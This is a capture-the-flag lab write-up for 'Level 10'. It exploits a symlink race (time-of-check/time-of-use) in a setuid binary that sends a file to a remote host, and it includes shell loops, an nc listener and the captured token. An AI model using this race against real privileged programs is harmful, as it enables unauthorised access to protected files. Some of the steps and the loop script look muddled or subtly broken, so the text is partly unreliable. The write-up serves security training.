## Level 10
    
In this level, we have an executable which will send a file to a remote host.
    ls -l
    
            -rwsr-s---+ 1 flag10 level10 8617 Mar  5  2016 level10
            -rw-------  1 flag10 flag10    26 Mar  5  2016 token

We can create a symlink to try to read the content in token file (symlink race)

    ln -s /home/user/level10/token /tmp/flag

Now let's try to send my file to the server

    ./level10 /tmp/flag 192.168.56.101
        You don't have access to /tmp/flag
    cat /tmp/flag
            cat: /tmp/flag: Permission denied

Nope, still unable to execute my flag and to send it to a server

To open a port in your machine:
    nc -l 6969

let's get the executable to my host with scp

    scp -P 4242 level10@192.168.56.101:/tmp/flag /mnt/nfs/homes/emaugale/Desktop

So you have to find a way to make your file accessible to the server.

when we use ltrace, we can see that the executable will first try to access our file, and after that, reading the content of the file.
    -> Do a /tmp/flag file with nothing on int
    when it will be access, we can delete it and recreate one which will be a symlink to the token file
    launch our server and print the result  

        while true;
            do
            touch /tmp/link
            rm -f /tmp/link
            ln -s /home/user/level10/token /tmp/link
            rm -f /tmp/link
            done


        while true;
        do
        /home/user/level10/level10 /tmp/link 192.168.56.101 2> /dev/null
        done


bash /tmp/script1.sh & bash /tmp/script2.sh

Check flag.Here is your token : feulo4b72j7edeahuete3no7c